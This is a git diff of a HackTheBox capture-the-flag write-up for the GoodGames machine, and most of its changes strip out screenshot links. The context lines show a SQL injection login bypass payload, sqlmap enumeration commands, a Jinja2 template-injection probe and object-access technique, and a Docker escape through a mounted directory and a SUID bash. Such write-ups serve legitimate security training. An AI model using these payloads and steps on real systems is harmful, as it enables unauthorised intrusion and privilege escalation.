@@ -5,12 +5,12 @@ categories: [HackTheBox Writeups]
 tags: [hackthebox, linux]
 ---
 
-![[Assets/aimage/Pasted image 20250906184619.png]]
+
 
 The page title is GoodGames and the footer discloses that the site runs on goodgames.htb .
  Let's add this to our hosts file.
 10.10.11.130 goodgames.htb
-![[Assets/aimage/Pasted image 20250906185017.png]]
+
 
 Directory enumaration:
 ```
@@ -59,7 +59,6 @@ Progress: 21372 / 220559 (9.69%)^C
 Payload:
 admin' or 1 = 1 -- -
 Replace in burp login request, just change admin param to the payload and forward.
-![[Assets/aimage/Pasted image 20250906185327.png]]
 
 To enumarate the Database using the vuln:
 1.  Save Burp Request to a file:
@@ -89,24 +88,22 @@ Notice that we have received the session cookie, we change the email back to the
 sqlmap -r goodgames.req --dbs
 ```
 
-![[Assets/aimage/Pasted image 20250906191136.png]]
+
 
 ```
 sqlmap -r goodgames.req -D main --tables
 ```
-![[Assets/aimage/Pasted image 20250906191317.png]]
+
 Parse through crackstation = superadministrator
 
 
 Refresh the /profile admin and in Response we find a subdomain:  
 Add to host file:
-![[Assets/aimage/Pasted image 20250906192511.png]]
+
 
 Login with creds and then we have SSTI:
 Payload: {% raw %}{{7+7}}{% endraw %} or *
-![SSTI 1](/assets/img/htb-writeups/Pasted image 20250906194032.png)
 
-![SSTI 2](/assets/img/htb-writeups/Pasted image 20250906194642.png)
 
 - Injection into a **Jinja2 template** (`{% raw %}{{ ... }}{% endraw %}` syntax).
 - You abuse Python object access (`config.__class__.__init__.__globals__`) to reach the `os` module.
@@ -128,7 +125,7 @@ Then we construct  SSTI payload to deliver on site through the name field.
 
 #### Privilege Escalation via Docker Escape
 After getting a shell on the system, we quickly notice that we are in a Docker container
-![[Assets/aimage/Pasted image 20250906195431.png]]
+
 
 ```
 hostname -I
@@ -143,11 +140,10 @@ ls -l from_host # It shows up on the container
 ```
 mount
 ```
-![[Assets/aimage/Pasted image 20250906201626.png]]
+
 With knowledge that the user directory is mounted in the Docker container, we can write files in the Host and change their permissions to root from within the container. These new permissions will be reflected to the Host system as well.
 
 
-![[Assets/aimage/Pasted image 20250906201346.png]]
 
 Scan 172.19.0.1 to see available ports with bash 
 ```
@@ -170,7 +166,7 @@ Login back to augustus and execute bash:
 ```
 ./bash -p
 ```
-![[#.Assets/aimage/Pasted image 20250906201805.png]]
+
 
 Running `ldd` shows how this binary loads libraries
 ```
